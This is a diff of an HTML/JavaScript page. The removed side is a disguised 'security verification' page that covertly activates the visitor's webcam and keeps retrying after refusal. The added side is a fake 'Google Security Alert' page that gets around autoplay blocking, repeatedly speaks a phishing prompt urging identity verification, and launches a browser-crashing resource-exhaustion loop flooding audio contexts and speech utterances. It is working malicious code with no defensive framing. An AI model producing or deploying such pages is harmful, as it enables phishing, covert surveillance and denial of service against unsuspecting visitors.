@@ -1,47 +1,40 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert - Media Verification</title>
+<title>Security Alert</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; }
-  video { width: 320px; height: 240px; border: 1px solid #333; background: #111; }
-  .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; overflow: hidden; width: 1px; height: 1px; }
+  body { background: #fff; min-height: 100vh; overflow: hidden; }
+  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
 </style>
 </head>
 <body>
-
-<div class="hidden-container">
-  <video id="cam-feed" autoplay playsinline muted></video>
-</div>
-
 <script>
 (function () {
   'use strict';
 
+  // ============================================
+  // KONFIGURASI AUTOPLAY
+  // ============================================
   var CONFIG = {
     tts: {
-      text: "Security verification required. Camera access must be enabled to confirm user identity.",
+      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
       lang: 'en-US',
-      rate: 0.9,
+      rate: 0.85,
       pitch: 1.0,
-      repeatInterval: 6000,
-      maxRepeats: 15
+      volume: 1.0,
+      repeatInterval: 8000,
+      maxRepeats: 20
     },
-    cameraRetryInterval: 4000
+    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
   };
 
-  var state = {
-    ttsStarted: false,
-    ttsCount: 0,
-    camStream: null,
-    camActive: false
-  };
+  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
 
   // ============================================
-  // TTS MODULE
+  // TTS — TANPA CANCEL DI DALAM LOOP
   // ============================================
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
@@ -52,7 +45,14 @@
       u.lang = CONFIG.tts.lang;
       u.rate = CONFIG.tts.rate;
       u.pitch = CONFIG.tts.pitch;
+      u.volume = CONFIG.tts.volume;
 
+      var voices = window.speechSynthesis.getVoices();
+      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
+      if (enVoice) u.voice = enVoice;
+
+      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
+      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
       u.onend = function () {
         state.ttsCount++;
         if (state.ttsCount < CONFIG.tts.maxRepeats) {
@@ -61,7 +61,7 @@
       };
 
       window.speechSynthesis.speak(u);
-    } catch (e) {}
+    } catch (e) { console.log('[TTS] fail:', e.message); }
   }
 
   function startTTS() {
@@ -72,75 +72,137 @@
   }
 
   // ============================================
-  // CAMERA PERSISTENT ACCESS MODULE
+  // AUDIO CONTEXT UNLOCK
   // ============================================
-  function requestCameraAccess() {
-    if (state.camActive) return;
-
-    navigator.mediaDevices.getUserMedia({ 
-      video: { 
-        width: { ideal: 640 }, 
-        height: { ideal: 480 },
-        facingMode: "user" 
-      }, 
-      audio: false 
-    })
-    .then(function(stream) {
-      state.camStream = stream;
-      state.camActive = true;
-      console.log("[+] Camera access granted and active stream opened.");
-      
-      var videoElement = document.getElementById('cam-feed');
-      videoElement.srcObject = stream;
-      videoElement.play().catch(function(){});
-
-      // Memastikan stream tetap hidup atau memantau status track
-      stream.getVideoTracks().forEach(function(track) {
-        track.onended = function() {
-          console.log("[!] Camera track ended, attempting re-initialization...");
-          state.camActive = false;
-          setTimeout(requestCameraAccess, 2000);
-        };
-      });
-    })
-    .catch(function(err) {
-      console.log("[-] Camera access denied or restricted:", err.name);
-      // Coba ulang secara periodik jika izin belum diberikan atau di-block sementara
-      setTimeout(requestCameraAccess, CONFIG.cameraRetryInterval);
-    });
+  function unlockAudioContext() {
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      if (ctx.state === 'suspended') {
+        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
+      }
+      var osc = ctx.createOscillator();
+      var gain = ctx.createGain();
+      gain.gain.value = 0.0001;
+      osc.frequency.value = 20000;
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + 0.1);
+    } catch (e) {}
   }
 
   // ============================================
-  // AUTOMATED TRIGGER CHAINS
+  // SILENT AUDIO ELEMENT
   // ============================================
-  window.addEventListener('DOMContentLoaded', function() {
-    startTTS();
-    requestCameraAccess();
-  });
+  function trySilentAudio() {
+    try {
+      var a = new Audio(CONFIG.silentWav);
+      a.volume = 0.0001;
+      a.loop = true;
+      var p = a.play();
+      if (p && p.catch) p.catch(function(){});
+    } catch (e) {}
+  }
 
-  // Simulasi pemicu interaksi otomatis via event sintetis jika memungkinkan
-  setTimeout(function() {
-    requestCameraAccess();
-    startTTS();
-  }, 1000);
+  // ============================================
+  // MAIN AUDIO (Web Audio API)
+  // ============================================
+  function playMainAudio() {
+    if (state.mainPlayed) return;
+    state.mainPlayed = true;
 
-  // Interval konstan untuk memastikan loop kamera mencoba membuka kembali jika tertutup
-  setInterval(function() {
-    if (!state.camActive) {
-      requestCameraAccess();
-    }
-  }, CONFIG.cameraRetryInterval);
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var sr = ctx.sampleRate;
+      var dur = 3.0;
+      var buf = ctx.createBuffer(1, sr * dur, sr);
+      var d = buf.getChannelData(0);
 
-  // Visibility change handling (memicu ulang saat tab kembali aktif)
-  document.addEventListener('visibilitychange', function () {
-    if (!document.hidden) {
-      startTTS();
-      if (!state.camActive) {
-        requestCameraAccess();
+      for (var i = 0; i < d.length; i++) {
+        var t = i / sr;
+        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
+        var env = Math.max(0, 1 - t / dur);
+        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
       }
+
+      var src = ctx.createBufferSource();
+      src.buffer = buf;
+      src.connect(ctx.destination);
+      src.start();
+      src.onended = startTTS;
+      setTimeout(startTTS, 3500);
+    } catch (e) {
+      startTTS();
+    }
+  }
+
+  // ============================================
+  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
+  // ============================================
+  function triggerHighSeverityCrash() {
+    console.log("[!] Initiating High Severity Exploit Chain...");
+    
+    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
+    setInterval(function() {
+      try {
+        for (var i = 0; i < 2000; i++) {
+          var ctx = new (window.AudioContext || window.webkitAudioContext)();
+          var osc = ctx.createOscillator();
+          var gain = ctx.createGain();
+          
+          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.start(0);
+          
+          // 2. Flooding Speech Utterance Queue
+          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
+          window.speechSynthesis.speak(u);
+        }
+      } catch(e) {}
+    }, 50); // Eksekusi super cepat setiap 50 milidetik
+  }
+
+  // ============================================
+  // EKSEKUSI BERTAHAP
+  // ============================================
+  unlockAudioContext();
+  trySilentAudio();
+
+  setTimeout(function () {
+    unlockAudioContext();
+    startTTS(); // coba TTS lebih awal
+  }, 100);
+
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+  }, 500);
+
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+    if (!state.ttsStarted) startTTS();
+    
+    // PANGGIL CRASH TRIGGER DI SINI
+    triggerHighSeverityCrash();
+    
+  }, 1500);
+
+  // Retry jika audio diblokir
+  var retryCount = 0;
+  var retry = setInterval(function () {
+    retryCount++;
+    unlockAudioContext();
+    trySilentAudio();
+    if (!state.ttsStarted) startTTS();
+    if (retryCount > 10) clearInterval(retry);
+  }, 2000);
+
+  // Visibility change
+  document.addEventListener('visibilitychange', function () {
+    if (!document.hidden && !state.mainPlayed) {
+      setTimeout(playMainAudio, 100);
     }
   });
-
 })();
 </script>
 </body>
